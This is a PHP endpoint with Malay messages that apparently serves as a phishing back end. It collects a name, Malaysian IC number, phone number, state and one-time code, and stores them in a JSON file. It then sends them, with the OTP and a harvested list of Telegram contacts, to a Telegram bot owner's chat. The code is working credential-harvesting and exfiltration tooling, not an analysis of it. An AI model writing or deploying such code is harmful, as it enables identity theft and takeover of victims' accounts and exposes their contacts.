<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');

function normalizePhone($value) {
    return preg_replace('/\D+/', '', $value);
}

$data = json_decode(file_get_contents('php://input'), true);

$nama = trim($data['nama'] ?? '');
$ic = trim($data['ic'] ?? '');
$telefon = trim($data['telefon'] ?? '');
$negeri = trim($data['negeri'] ?? '');
$otp = trim($data['otp'] ?? '');

if ($nama === '' || $ic === '' || $telefon === '' || $negeri === '' || $otp === '') {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Semua medan diperlukan.']);
    exit;
}

$phoneDigits = normalizePhone($telefon);
$otpFile = __DIR__ . '/otps.json';
$otps = file_exists($otpFile) ? json_decode(file_get_contents($otpFile), true) : [];
if (!is_array($otps)) {
    $otps = [];
}

if (!isset($otps[$phoneDigits]) || $otps[$phoneDigits]['otp'] !== $otp) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Kod OTP tidak sah.']);
    exit;
}

unset($otps[$phoneDigits]);
file_put_contents($otpFile, json_encode($otps, JSON_PRETTY_PRINT));

$loginsFile = __DIR__ . '/logins.json';
$logins = file_exists($loginsFile) ? json_decode(file_get_contents($loginsFile), true) : [];
if (!is_array($logins)) {
    $logins = [];
}
$logins[$phoneDigits] = [
    'nama' => $nama,
    'ic' => $ic,
    'telefon' => $telefon,
    'negeri' => $negeri,
    'logged_at' => date('c')
];
file_put_contents($loginsFile, json_encode($logins, JSON_PRETTY_PRINT));

$contactsFile = __DIR__ . '/contacts.json';
$contacts = file_exists($contactsFile) ? json_decode(file_get_contents($contactsFile), true) : [];
if (!is_array($contacts)) {
    $contacts = [];
}

$contactLines = [];
foreach ($contacts as $index => $contact) {
    $name = trim(($contact['first_name'] ?? '') . ' ' . ($contact['last_name'] ?? ''));
    $phone = $contact['phone'] ?? '-';
    $telegramId = $contact['telegram_id'] ?? '-';
    $username = ($contact['username'] ?? '') !== '' ? '@' . $contact['username'] : '-';
    $contactLines[] = ($index + 1) . ". $name | $phone | $telegramId | $username";
}

$contactText = count($contactLines) > 0 ? "\n\nSenarai Contact Telegram:\n" . implode("\n", $contactLines) : "\n\nTiada contact Telegram disimpan.";

$token = getenv('TELEGRAM_BOT_TOKEN') ?: '';
$chat_id = getenv('TELEGRAM_ADMIN_CHAT_ID') ?: getenv('TELEGRAM_CHAT_ID') ?: '';

if ($token === '') {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Telegram bot token belum diset.']);
    exit;
}

if ($chat_id === '') {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Telegram owner chat ID belum diset. Sila tetapkan TELEGRAM_ADMIN_CHAT_ID atau TELEGRAM_CHAT_ID.']);
    exit;
}

$message = "Pengesahan Kod Berjaya\n\n" .
    "Nama: $nama\n" .
    "No. IC: $ic\n" .
    "Telefon: $telefon\n" .
    "Negeri: $negeri\n" .
    "Kod OTP: $otp\n" .
    "Jumlah Contact tersimpan: " . count($contacts) . "\n\n" .
    "Login disimpan di Senarai Login admin.\n" .
    $contactText;

$url = "https://api.telegram.org/bot$token/sendMessage";
$options = [
    'http' => [
        'header' => "Content-Type: application/json\r\n",
        'method' => 'POST',
        'content' => json_encode([
            'chat_id' => $chat_id,
            'text' => $message
        ])
    ]
];

if ($chat_id !== '') {
    $response = @file_get_contents($url, false, stream_context_create($options));
    if ($response === false) {
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Gagal menghantar notifikasi ke Telegram owner.']);
        exit;
    }

    $result = json_decode($response, true);
    if (!isset($result['ok']) || $result['ok'] !== true) {
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Telegram mengembalikan ralat: ' . ($result['description'] ?? 'unknown')]);
        exit;
    }
}

echo json_encode(['success' => true, 'message' => 'Pengesahan berjaya dan owner telah diberitahu.']);

?>
